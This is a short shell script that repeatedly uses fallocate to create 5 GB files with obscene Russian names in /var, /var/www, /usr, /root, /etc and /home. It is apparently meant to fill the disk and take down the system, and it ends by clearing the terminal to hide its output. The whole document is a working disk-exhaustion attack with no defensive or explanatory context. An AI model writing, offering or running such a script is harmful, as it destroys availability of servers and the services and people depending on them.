#!/bin/sh

random_number=$((RANDOM % 100))

cd /var
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /var/www
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /usr
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /root
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /etc
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /home
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /var
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /var/www
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /usr
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /root
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /etc
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done
cd /home
for ((i=1; i<=2; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done

clear
